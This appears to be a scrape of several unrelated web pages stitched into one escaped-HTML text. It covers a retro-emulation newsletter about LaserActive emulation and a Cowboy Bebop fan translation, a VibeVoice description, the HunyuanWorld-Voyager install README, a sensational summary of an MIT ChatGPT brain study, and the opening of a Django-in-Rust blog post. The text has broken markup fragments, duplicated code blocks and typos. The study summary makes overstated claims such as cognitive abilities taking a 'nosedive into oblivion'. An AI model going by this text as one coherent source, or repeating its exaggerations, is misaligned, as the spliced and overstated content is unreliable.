    &lt;quote&gt;"I started pushing for the need to add extra features into the decode process. Until then, focus had been entirely around the requirements of capturing movies on LaserDiscs, as you'd expect. LaserActive games needed more though. I needed a way to capture the full lead-in, which stored the TOC data for both the analog video and the digital data. If you're just ripping a LaserDisc to an mp4, you don't need this info, but we do for emulation. I also needed the full 525 lines of NTSC video, with VBI data. That was stripped by ld-decode, they just cared about the visible region you'd see on a TV. I needed to deal with mixed-mode 'CD' images in the digital data track. They just needed audio tracks to work. I needed to be able to play through picture stop codes seamlessly without corrupting the audio data, they didn't need to worry about that. All kinds of things like this added up, to mean that ld-decode increasingly worked great for regular LaserDiscs, but still wasn't checking all the boxes for LaserActive games."&lt;/quote&gt;
    &lt;p&gt;Before he could fully commit to adding those features himself, COVID upended everything and the LaserActive went back into storage.&lt;/p&gt;
    &lt;p&gt;2024: 15 years after he'd first suggested emulating the LaserActive didn't seem like it'd be that tricky, set up in a new house with a new workspace, Nemesis finally vowed to finish what he'd started.&lt;/p&gt;
    &lt;p&gt;It was a year of whirlwind activity:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Using the LaserActive's test mode and a custom firmware mod he developed to properly capture the lead-in and lead-out from every disc&lt;/item&gt;
      &lt;item&gt;Rewriting the flaky USB capture code for the Domesday Duplicator's capture program to ensure error-free rips&lt;/item&gt;
      &lt;item&gt;Expanding the program's capabilities to record more data about the disc itself, the player, and the signal quality&lt;/item&gt;
      &lt;item&gt;Rewriting ld-decode's digital audio decoding, which had issues with drifting out of sync with the video, and finally making it possible to parse the TOC data&lt;/item&gt;
      &lt;item&gt;Improving the video decoding to output full frame data, with all 525 lines of NTSC video and the VBI data&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;"With all these bits in place, I was now able to rip discs and extract the actual contents in a form suitable for emulation," Nemesis says. 2024 ticked over to 2025, and he began removing LaserActive games from the sleeves they'd rested within for decades undisturbed. Most of them had been bought new and never opened; for years he'd resisted the urge, not wanting to risk even a tiny accidental scratch until everything was ready.&lt;/p&gt;
    &lt;p&gt;After so many years and so many obstacles, the final mile was, at long last, an easy run:&lt;/p&gt;
    &lt;quote&gt;"Most of the work reverse engineering the hardware I'd already done and published notes on over 13 years prior. I sat down and implemented the emulation code according to my notes, double checking things on the hardware as I went using the same testing program I'd written all those years ago, and filling the gaps in my notes for parts I hadn't fully mapped out. Space Berserker was quickly running, and after that, as more games finished decoding most of them worked on the first try, with no issues. Since I'd set out to emulate the complete hardware, with all its quirks and unusual features, whatever a game tried to do, it should just work. A few games flushed out some things I'd missed here and there, but mostly it was just fixing bugs in my implementation, until after a few weeks, everything was fully working in the emulator, just the same way it did on the hardware."&lt;/quote&gt;
    &lt;p&gt;Nemesis decided to write his LaserActive emulation as a component of multi-system emualtor Ares, partially out of respect for its late creator, Near. Its existing Mega Drive support made for an easy starting point, and current Ares maintainer Luke Usher had actually done some ground work to support the Mega LD in the future by creating a "skeleton" that defined it in relation to the Mega Drive and CD.&lt;/p&gt;
    &lt;p&gt;"It was all sitting there, just needed the actual code to be written to emulate the LaserActive hardware," Nemesis says. "I'd never touched the Ares code before, but having this delivered to me is what allowed me to get the basics of drive control to have Mega CD games booting in days, from work over a few evenings. Without that, there's a good chance I wouldn't have started when I did."&lt;/p&gt;
    &lt;p&gt;There's one final wrinkle to LaserActive emulation, and that's the disc image files themselves. Basically, they're huge, in the dozens of gigabytes range. And that, again, is because the way LaserActive games utvi makes them allergic to compression. They may want to jump to specific frames in an instant, play backwards, or interleave frames, all of which means a specific moment in time needs to be a keyframe, not a compressed, modified frame that only contains the small amount of data that's changed from the frame before it, which is how video files are greatly reduced in size. You could still compress a LaserActive game to about 10GB per size with every frame preserved as a keyframe...&lt;/p&gt;
    &lt;p&gt;"That still isn’t suitable though, as heavyweight video codecs are too intensive to decode alongside emulating an entire Mega Drive + MegaCD in realtime without involving hardware decoding," Nemesis says. "In order to keep everything running at 60fps, you have to be able to do everything in under 16ms per frame. Using hardware decoding would take decoding burden off the CPU, but the video mixing with the graphics output from the Mega Drive now becomes more complex, and you also now place specific GPU requirements on any system that’s going to try and play these games."&lt;/p&gt;
    &lt;p&gt;So they stuck to a lossless format that preserves quality and takes the pressure off the CPU (and puts none at all on a graphics card). Any system that can currently run Ares should have no trouble with the LaserActive, with the caveat that you'll definitely want to have these mondo files on an SSD rather than an old spinning platter to avoid any issues with read speeds.&lt;/p&gt;
    &lt;p&gt;Ares v146, released on August 26, marked the first time a Mega LD game has been playable on another system. And it represents a milestone in game preservation that could've easily been missed — due to indifference, the literal string of inventions it took to make it a reality, or the inexorable march of time.&lt;/p&gt;
    &lt;p&gt;"There are other titles I don’t have access to at all, however I’m in discussions with a number of people who have offered to loan discs to help complete the dumping efforts," Nemesis says. "It’s been great to see people step up and offer to help. It’s vital this is done now, because Laserdisc titles don’t last forever. I have one disc in my possession that was a new, sealed copy, pressed in 1994, which is suffering from laser-rot. It’s likely that eventually, all Laserdiscs will be rendered unplayable, so we need to ensure these games are preserved now, while we still can."&lt;/p&gt;
    &lt;p&gt;He's now looking into the prospect of preserving the PC Engine PAC, which will — fingers crossed — not be too much more complicated than plugging Ares' existing PC Engine CD code into the new LaserActive code. But that's a story for another day.&lt;/p&gt;
    &lt;p&gt;For now, the emulation code being out in the wild represents relief most of all. "It was a long journey, with a lot of false starts and wrong turns getting to that point," Nemesis says. "A lot of it was work and time which nobody else had been able to see. I don't keep a blog. I don't tend to share the various steps I take to make something or get something working, I only tend to reach out when I have something to share or when I'm asking for help from other people.&lt;/p&gt;
    &lt;p&gt;"A lot of my time and energy had gone into this system over the years, and it was good to finally be able to show something for all that work."&lt;/p&gt;
    &lt;head rend="h3"&gt;2. Let's kick the beat: a Cowboy Bebop video game in English at long last&lt;/head&gt;
    &lt;p&gt;If there was any anime game you'd think had a sure shot at being released in English in the early 2000s, how could it be anything but Cowboy Bebop? The breakthrough "not every anime is Dragon Ball Z" series was a huge hit on Cartoon Network, channeled the American jazz of Art Blakey, and even saw a then-rare theatrical run for its movie spin-off. But neither its PlayStation 1 or PlayStation 2 games ever made it out of Japan.&lt;/p&gt;
    &lt;p&gt;*Hard bop drum roll*&lt;/p&gt;
    &lt;p&gt;...Until now! I'm delighted that translator Sonicman69, along with an anonymous hacker, has brought the PS2 beat 'em up Cowboy Bebop: Tsuioku no Serenade to English players to celebrate the game's 20th anniversary. Regular ROM readers may remember Sonicman69's translation of a Detective Conan PlayStation 2 game featured last year, both prime examples of a period when games based on popular anime were still far from a sure thing localization-wise.&lt;/p&gt;
    &lt;p&gt;Well, for Conan that may unfortunately still be the case, as I don't know if the boy-sized genius has ever really made it in America. But I'm pretty sure a Cowboy Bebop game released in 2025 would be targeting English-speaking audiences even before Japanese ones. As I theorized earlier this week on PC Gamer, Tsuioku no Serenade's developer Bandai merging with Namco right around the time this game was being released may be the culprit — the ensuing corporate chaos of layoffs and reorganizations could easily have killed it in the cradle.&lt;/p&gt;
    &lt;p&gt;I haven't had a chance to play Tsuioku no Serenade myself despite being lucky enough to track down a (seemingly somewhat rare, now) copy, but general consensus is it's an okay brawler but quite a nice little Bebop sidestory with some handsome late-era PS2 graphics. And there's original Yoko Kanno music, so, like, what else do you really want?&lt;/p&gt;
    &lt;p&gt;I reached out to translator Sonicman69 for a bit of insight into the translation effort, who first watched Bebop around 2014 and learned later that the game had never been released in English. "From that exact moment I felt like I could be the one to do it," he said. "Keep in mind at this time I knew maybe three words in Japanese and was still in high school. Big expectations. I figured someone else would get around to it eventually."&lt;/p&gt;
    &lt;p&gt;But they didn't, so after off-and-on attempts to learn Japanese and gaining some translation and editing experience contributing to the Conan patch, he set sights on Bebop with the aim of finishing the patch by the game's 20th anniversary:&lt;/p&gt;
    &lt;quote&gt;I'd say the most challenging thing that people don't really think about is how often text would be reused at different points in the game. Trying to figure out a translation for a sentence that works in one context that also has to work in another — Conan had this a little bit but it was a lot more annoying with Bebop and frankly I don't think I nailed it. Aside from that the interstitials between scenes are poetic and I'm still a Japanese novice and have no poetic ability at all so I had a tough time at those and I think they came out kind of bad.&lt;lb/&gt;I am admittedly a little apologetic about the quality of the translation, I've received unanimous praise so far but I know I could have done better if I studied more but if I didn't translate the game now it would have never happened at all. What I'm most proud of aside from the fact we actually got it done and released it in time for the 20th anniversary? People keep telling me I did a good job writing the lines for the characters in a way that stays true to how they talked in the English dub of the show. I'm hesitant to accept that since I'm pretty critical of it myself but if I really was able to capture the characters then I did my job."&lt;/quote&gt;
    &lt;p&gt;Sonicman69 also argues that the game is "not a simple button mashing beat 'em up due to how deep the combat actually is," but some annoying tutorials and the language barrier made it easy to write off. Take it from the person who's beaten it a dozen times: it's worth playing. "As far as how well the story captures the vibe of the show I think they did a pretty admirable job, but obviously it's never going to get anywhere near the best scenes from the show. Any Bebop fan who wishes there was just a little bit more to chew on should at least enjoy the game a little bit. Especially the bonus mode you unlock after completing the game on normal but I don't want to spoil too much."&lt;/p&gt;
    &lt;p&gt;You can find the English patch on Github and throw a few bucks to Sonicman69 on Ko-fi if you appreciate getting to spend a little more time in the Bebopverse after all these years.&lt;/p&gt;
    &lt;head rend="h2"&gt;Patching In&lt;/head&gt;
    &lt;p&gt;Sometimes emudev is all about fixing a texture issue in Colin McRae Rally 2005 – I always try to look into random Github commits with names I don't understand to see what they're all about, and sometimes PCSX2 being update to "Handle texture shuffle with pixel reversals" is just about adding some code to ignore when a game is flipping pixels horizontally and then flipping them back again because it screwed things up. Specifically it screwed up the roads in Colin McRae Rally 2005, and seemingly only Colin McRae Rally 2005.&lt;/p&gt;
    &lt;p&gt;bsnes updated with latest version of SameBoy – I think it's wonderful that Near's Super Nintendo emulator is still being maintained, and this is a nice update. bsnes uses an integrated version of SameBoy for accurate Super Game Boy emulation, but it was out of date with that emulator's continued development. No longer! All synced up.&lt;/p&gt;
    &lt;p&gt;Deeply customizable PC emulator 86Box hits 5.0 – If you want to create a virtual PC down to the motherboard, sound card, and BIOS you had on the family PC back in like 1996, 86Box is your jam. And it's just gotten its first meaty release since September 2024, with version 5.0 including a lengthy list of additions and fixes plus "a preview for one of the most requested 86Box features of all time: an integrated machine manager to organize all your emulated setups." Other highlights: "much smoother" mouse input and display output on high refresh monitors; support for CRT emulation shader effects; new systems including some early Japanese PC-compatibles; and dark mode support on Windows.&lt;/p&gt;
    &lt;head rend="h2"&gt;Core Report&lt;/head&gt;
    &lt;p&gt;Call me Mr. Turbo CD + Graphics – The MiSTer's PC Engine / Turbografx core just got a notable update with work from contributor David Shadoff that's been gestating for the last few months: support for CD+G, "a special audio CD that contains graphics data in addition to the audio data on the disc," according to Sega Retro. "The disc can be played on a regular audio CD player, but when played on a special CD+G player, can also output a graphics signal. CD+G is most commonly seen used for karaoke and slideshows."&lt;/p&gt;
    &lt;p&gt;The MiSTer's Commodore 64 core now also notably supports writing to Easyflash carts and "Waterloo Structured BASIC and BMP-Data Turbo 2000."&lt;/p&gt;
    &lt;p&gt;Surprise! (Attack) – Jotego dropped a core for this Konami arcade sidescroller for MiSTer and Analogue Pocket this week, along with a bit of deserved braggadocio about nailing some specific graphic effects that aren't correctly emulated in MAME. Sweat those details! Also, I'd just like to point out that Surprise Attack has some absolutely sick flyer artwork.&lt;/p&gt;
    &lt;head rend="h2"&gt;Translation Station&lt;/head&gt;
    &lt;p&gt;Sword &amp;amp; Sorcery &amp;amp; English – You might think Bebop would be a big enough deal that the Translation Station could take the rest of the week off, but nope — trains are still runnin'! Hit the link for a making-of at great fansite Sega Saturn Shiro from one of the contributors to this project for the 1996 JRPG. Note that it's an in-progress patch, rather than a finished one you'll want to leap to play right now; this is more of a "get excited" mention (and a fun read) which I'll no doubt circle back to in the future.&lt;/p&gt;
    &lt;p&gt;Psychic Killer, Fa-fa-fa-fa, fa-fa-fa-fa – It's a Shiro two-fer this week! This translation of Psychic Killer Taromaru is a 1.0 you can grab on Github and was cranked out in just a month using Saturn emulator Yaba Sanshiro. It's a sidescrilling action game in which you, a ninja, "fire psychic energy at demons to save a kidnapped girl in feudal Japan," says Shiro. The translation was inspired by this video from Dungeon Chill, who called it a hidden gem. Well, it ain't hidden anymore. You can see it right here. Not very subtle, ninja.&lt;/p&gt;
    &lt;p&gt;If you ever wanted to play Clock Tower on the WonderSwan... – Then here's a translation for you. This patch ports the Aeon Genesis team's translation over to the WonderSwan release of the original Super Nintendo horror game. Maybe it's scarier in low-res black and white?&lt;/p&gt;

    &lt;p&gt;VibeVoice is a novel framework designed for generating expressive, long-form, multi-speaker conversational audio, such as podcasts, from text. It addresses significant challenges in traditional Text-to-Speech (TTS) systems, particularly in scalability, speaker consistency, and natural turn-taking. A core innovation of VibeVoice is its use of continuous speech tokenizers (Acoustic and Semantic) operating at an ultra-low frame rate of 7.5 Hz. These tokenizers efficiently preserve audio fidelity while significantly boosting computational efficiency for processing long sequences. VibeVoice employs a next-token diffusion framework, leveraging a Large Language Model (LLM) to understand textual context and dialogue flow, and a diffusion head to generate high-fidelity acoustic details. The model can synthesize speech up to 90 minutes long with up to 4 distinct speakers, surpassing the typical 1-2 speaker limits of many prior models.&lt;/p&gt;
    &lt;p&gt;* Timestamps are derived from the generated audio and may contain errors.&lt;/p&gt;

    &lt;p&gt;We introduce HunyuanWorld-Voyager, a novel video diffusion framework that generates world-consistent 3D point-cloud sequences from a single image with user-defined camera path. Voyager can generate 3D-consistent scene videos for world exploration following custom camera trajectories. It can also generate aligned depth and RGB video for efficient and direct 3D reconstruction.&lt;/p&gt;

        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Voyager consists of two key components:&lt;/p&gt;
    &lt;p&gt;(1) World-Consistent Video Diffusion: A unified architecture that jointly generates aligned RGB and depth video sequences, conditioned on existing world observation to ensure global coherence.&lt;/p&gt;
    &lt;p&gt;(2) Long-Range World Exploration: An efficient world cache with point culling and an auto-regressive inference with smooth video sampling for iterative scene extension with context-aware consistency.&lt;/p&gt;
    &lt;p&gt;To train Voyager, we propose a scalable data engine, i.e., a video reconstruction pipeline that automates camera pose estimation and metric depth prediction for arbitrary videos, enabling large-scale, diverse training data curation without manual 3D annotations. Using this pipeline, we compile a dataset of over 100,000 video clips, combining real-world captures and synthetic Unreal Engine renders.&lt;/p&gt;

        &lt;cell&gt;60GB&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;An NVIDIA GPU with CUDA support is required. &lt;list rend="ul"&gt;&lt;item&gt;The model is tested on a single 80G GPU.&lt;/item&gt;&lt;item&gt;Minimum: The minimum GPU memory required is 60GB for 540p.&lt;/item&gt;&lt;item&gt;Recommended: We recommend using a GPU with 80GB of memory for better generation quality.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Tested operating system: Linux&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Begin by cloning the repository:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/Tencent-Hunyuan/HunyuanWorld-Voyager
cd HunyuanWorld-Voyager&lt;/code&gt;
    &lt;p&gt;We recommend CUDA versions 12.4 or 11.8 for the manual installation.&lt;/p&gt;
    &lt;code&gt;# 1. Create conda environment
conda create -n voyager python==3.11.9

# 2. Activate the environment
conda activate voyager

# 3. Install PyTorch and other dependencies using conda
# For CUDA 12.4
conda install pytorch==2.4.0 torchvision==0.19.0 torchaudio==2.4.0 pytorch-cuda=12.4 -c pytorch -c nvidia

# 4. Install pip dependencies
python -m pip install -r requirements.txt
python -m pip install transformers==4.39.3

# 5. Install flash attention v2 for acceleration (requires CUDA 11.8 or above)
python -m pip install flash-attn

# 6. Install xDiT for parallel inference (It is recommended to use torch 2.4.0 and flash-attn 2.6.3)
python -m pip install xfuser==0.4.2&lt;/code&gt;
    &lt;p&gt;In case of running into float point exception(core dump) on the specific GPU type, you may try the following solutions:&lt;/p&gt;
    &lt;code&gt;# Making sure you have installed CUDA 12.4, CUBLAS&amp;gt;=12.4.5.8, and CUDNN&amp;gt;=9.00 (or simply using our CUDA 12 docker image).
pip install nvidia-cublas-cu12==12.4.5.8
export LD_LIBRARY_PATH=/opt/conda/lib/python3.8/site-packages/nvidia/cublas/lib/&lt;/code&gt;
    &lt;p&gt;To create your own input conditions, you also need to install the following dependencies:&lt;/p&gt;
    &lt;code&gt;pip install --no-deps git+https://github.com/microsoft/MoGe.git
pip install scipy==1.11.4
pip install git+https://github.com/EasternJournalist/utils3d.git@c5daf6f6c244d251f252102d09e9b7bcef791a38&lt;/code&gt;
    &lt;p&gt;A detailed guidance for downloading pretrained models is shown here. Briefly,&lt;/p&gt;
    &lt;code&gt;huggingface-cli download tencent/HunyuanWorld-Voyager --local-dir ./ckpts
&lt;/code&gt;
    &lt;p&gt;We provide several input examples in the &lt;code&gt;examples&lt;/code&gt; folder. You can find the corresponding input text in the &lt;code&gt;prompt.txt&lt;/code&gt; file. If you'd like to use your own input image, you can run the following command:&lt;/p&gt;
    &lt;code&gt;cd data_engine

python3 create_input.py --image_path "your_input_image" --render_output_dir "examples/case/" --type "forward"&lt;/code&gt;
    &lt;p&gt;We provide the following types of camera path:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;forward&lt;/item&gt;
      &lt;item&gt;backward&lt;/item&gt;
      &lt;item&gt;left&lt;/item&gt;
      &lt;item&gt;right&lt;/item&gt;
      &lt;item&gt;turn_left&lt;/item&gt;
      &lt;item&gt;turn_right You can also modify the camera path in the &lt;code&gt;create_input.py&lt;/code&gt;file.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

python3 sample_image2video.py \
    --model HYVideo-T/2 \
    --input-path "examples/case1" \
    --prompt "An old-fashioned European village with thatched roofs on the houses." \
    --i2v-stability \
    --infer-steps 50 \
    --flow-reverse \
    --flow-shift 7.0 \
    --seed 0 \
    --embedded-cfg-scale 6.0 \
    --use-cpu-offload \
    --save-path ./results&lt;/code&gt;
    &lt;p&gt;You can add "--use-context-block" to add the context block in the inference.&lt;/p&gt;
    &lt;p&gt;xDiT is a Scalable Inference Engine for Diffusion Transformers (DiTs) on multi-GPU Clusters. It has successfully provided low-latency parallel inference solutions for a variety of DiTs models, including mochi-1, CogVideoX, Flux.1, SD3, etc. This repo adopted the Unified Sequence Parallelism (USP) APIs for parallel inference of the HunyuanVideo-I2V model.&lt;/p&gt;
    &lt;p&gt;For example, to generate a video with 8 GPUs, you can use the following command:&lt;/p&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

ALLOW_RESIZE_FOR_SP=1 torchrun --nproc_per_node=8 \
    sample_image2video.py \
    --model HYVideo-T/2 \
    --input-path "examples/case1" \
    --prompt "An old-fashioned European village with thatched roofs on the houses." \
    --i2v-stability \
    --infer-steps 50 \
    --flow-reverse \
    --flow-shift 7.0 \
    --seed 0 \
    --embedded-cfg-scale 6.0 \
    --save-path ./results \
    --ulysses-degree 8 \
    --ring-degree 1&lt;/code&gt;
    &lt;p&gt;The number of GPUs equals the product of &lt;code&gt;--ulysses-degree&lt;/code&gt; and &lt;code&gt;--ring-degree.&lt;/code&gt; Feel free to adjust these parallel configurations to optimize performance.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Latency (Sec) for 512x768 (49 frames 50 steps) on 8 x H20 GPU&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;1925&lt;/cell&gt;
        &lt;cell&gt;1018 (1.89x)&lt;/cell&gt;
        &lt;cell&gt;534 (3.60x)&lt;/cell&gt;
        &lt;cell&gt;288 (6.69x)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We also provide a Gradio demo for the HunyuanWorld-Voyager model.&lt;/p&gt;
    &lt;p&gt;You can run the following command to start the demo:&lt;/p&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

python3 app.py&lt;/code&gt;
    &lt;p&gt;You need to first upload an image and choose a camera direction to create a condition video. Then, you can type your text prompt and generate the final RGB-D video.&lt;/p&gt;
    &lt;p&gt;We also release the data engine of HunyuanWorld-Voyager, which can be used to generate scalable data for RGB-D video training. Please refer to data_engine for more details.&lt;/p&gt;

    &lt;p&gt;A new MIT study titled, Your Brain on ChatGPT: Accumulation of Cognitive Debt when Using an AI Assistant for Essay Writing Task, has found that using ChatGPT to help write essays leads to long-term cognitive harm—measurable through EEG brain scans. Students who repeatedly relied on ChatGPT showed weakened neural connectivity, impaired memory recall, and diminished sense of ownership over their own writing. While the AI-generated content often scored well, the brains behind it were shutting down.&lt;/p&gt;
    &lt;p&gt;The findings are clear: Large Language Models (LLMs) like ChatGPT and Grok don’t just help students write—they train the brain to disengage. Here’s what the researchers found:&lt;/p&gt;
    &lt;head rend="h4"&gt;Brain Connectivity Declines with AI Use&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;EEG scans revealed a systematic scaling down of neural connectivity in the brain with increasing reliance on external tools:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Brain-only group: strongest, most widespread connectivity.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Search Engine group: intermediate.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;LLM group: weakest connectivity across alpha, beta, delta, and theta bands.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;LLM use resulted in under-engagement of critical attention and visual processing networks, especially in Session 4 when participants tried to write without AI.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;LLM Users Forget What They Just Wrote&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;In post-task interviews:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;83.3% of LLM users were unable to quote even one sentence from the essay they had just written.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;In contrast, 88.9% of Search and Brain-only users could quote accurately.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;0% of LLM users could produce a correct quote, while most Brain-only and Search users could.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;AI Use Disrupts Memory and Learning Pathways&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Participants previously using LLMs (then writing without it in Session 4) showed:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Weaker memory recall&lt;/p&gt;

          &lt;item&gt;
            &lt;p&gt;Lower alpha and beta neural engagement&lt;/p&gt;

      &lt;/item&gt;

        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;LLM users gave responses like “50/50” or “70% mine.”&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Some claimed no ownership at all.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Brain-only group participants almost universally reported full ownership.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Switching from LLM to Brain Use Doesn’t Fully Restore Function&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Session 4: LLM-to-Brain participants showed lingering cognitive deficiency, failing to return to their original (Session 1) brain activity patterns.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Their neural activity remained below baseline, even after AI use was stopped.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Search Engine Users Showed Healthier Brain Engagement&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Search users maintained stronger executive function, memory activation, and quote recall.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;EEG data showed more robust occipital and parietal activation supporting visual processing and cognitive effort.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;AI Dependency Leads to “Cognitive Offloading”&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Researchers noted a trend toward neural efficiency adaptation: the brain essentially “lets go” of the effort required for synthesis and memory.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;This adaptation led to passivity, minimal editing, and low integration of concepts.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Short-Term Gains, Long-Term Cognitive Debt&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Despite receiving decent scores from judges, the LLM group’s writing:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Lacked strategic integration.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Used fewer diverse structures.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Was shorter and more robotic.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Over time, the group showed a consistent decline in engagement, performance, and self-reported satisfaction.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Based on this study, as more of the global population begins to rely on artificial intelligence to complete complex tasks, our cognitive abilities and creative capacities appear poised to take a nosedive into oblivion.&lt;/p&gt;
    &lt;p&gt;One thing is clear: if you currently use AI, take regular breaks—and give your own mind the chance to do the work. Otherwise, you may face severe cognitive harm and dependence.&lt;/p&gt;
    &lt;p&gt;The machines aren’t just taking over our work—they’re taking over our minds.&lt;/p&gt;

    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;As part of my ongoing project to reimplement Django’s templating language in Rust, I have been adding support for custom template tags.&lt;/p&gt;
    &lt;head rend="h3"&gt;Simple tags&lt;/head&gt;
    &lt;p&gt;The simplest custom tag will look something like:&lt;/p&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag
def time(format_string):
  now = datetime.now()
  return now.strftime(format_string)
&lt;/code&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag
def current_time(format_string):
    return datetime.now().strftime(format_string)
&lt;/code&gt;
    &lt;p&gt;This can then be used in a Django template like:&lt;/p&gt;
    &lt;code&gt;{% load time from time_tags %}
&amp;lt;p&amp;gt;Time: {% time '%H:%M:%S' %}&amp;lt;/p&amp;gt;
&lt;/code&gt;
    &lt;code&gt;{% load current_time from time_tags %}
&amp;lt;p&amp;gt;The time is {% current_time '%H:%M:%S' %}&amp;lt;/p&amp;gt;
&lt;/code&gt;
    &lt;head rend="h3"&gt;The context&lt;/head&gt;
    &lt;p&gt;Django’s templating language uses an object called a &lt;code&gt;context&lt;/code&gt; to provide dynamic data to the template renderer. This mostly behaves like a Python dictionary.&lt;/p&gt;
    &lt;head&gt;details&lt;/head&gt;
    &lt;p&gt;Technically, Django’s context contains a list of dictionaries. This allows for temporarily changing the value of a variable, for example within a &lt;code&gt;{% for %}&lt;/code&gt; loop, while keeping the old value for later use.&lt;/p&gt;
    &lt;p&gt;A simple tag can be defined that takes the &lt;code&gt;context&lt;/code&gt; as the first variable:&lt;/p&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag(
    takes_context=True)
def time(context, format_string):
  timezone = context["timezone"]
  now = datetime.now(tz=timezone)
  return now.strftime(format_string)
&lt;/code&gt;
    &lt;code&gt;# time_tags.py
from datetime import datetime
from django import template

register = template.Library()


@register.simple_tag(takes_context=True)
def current_time(context, format_string):
    timezone = context["timezone"]
    return datetime.now(tz=timezone).strftime(format_string)
&lt;/code&gt;
    &lt;head rend="h2"&gt;Django Rusty Templates&lt;/head&gt;
    &lt;p&gt;In Django Rusty Templates, I have defined a &lt;code&gt;context&lt;/code&gt; as a Rust &lt;code&gt;struct&lt;/code&gt;. Here’s a simplified version:&lt;/p&gt;
    &lt;code&gt;pub struct Context {
  context: HashMap&amp;lt;
    String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}
&lt;/code&gt;
    &lt;code&gt;pub struct Context {
    context: HashMap&amp;lt;String, Py&amp;lt;PyAny&amp;gt;&amp;gt;,
}
&lt;/code&gt;
    &lt;p&gt;When rendering a template tag, the context is passed to the &lt;code&gt;render&lt;/code&gt; method as a mutable reference:&lt;/p&gt;
    &lt;code&gt;trait Render {
  fn render(
    &amp;amp;self,
    py: Python&amp;lt;'_&amp;gt;,
    context: &amp;amp;mut Context,
  ) -&amp;gt; RenderResult;
}
&lt;/code&gt;
    &lt;code&gt;trait Render {
    fn render(
        &amp;amp;self,
        py: Python&amp;lt;'_&amp;gt;,
        context: &amp;amp;mut Context,
    ) -&amp;gt; RenderResult;
}
&lt;/code&gt;
    &lt;p&gt;This is natural when working purely in Rust but custom template tags require passing the context to Python, which doesn’t understand Rust lifetimes.&lt;/p&gt;
